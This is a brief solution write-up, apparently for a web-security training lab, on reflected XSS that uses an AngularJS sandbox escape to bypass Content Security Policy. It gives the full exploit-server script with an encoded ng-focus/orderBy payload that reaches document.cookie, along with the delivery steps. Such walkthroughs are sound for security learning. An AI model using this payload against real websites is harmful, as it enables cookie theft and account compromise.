# Lab: Reflected XSS with AngularJS sandbox escape and CSP

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/5189f85b-e2b7-4d11-91fa-c54c5f0a0303)

## Solution

Go to the exploit server and in the body section enter -
`<script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>`

Then click on **store** and then **Deliver exploit to vitctm** to finish the lab.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/8f181830-03ea-4e0f-8b4c-75619deafca8)
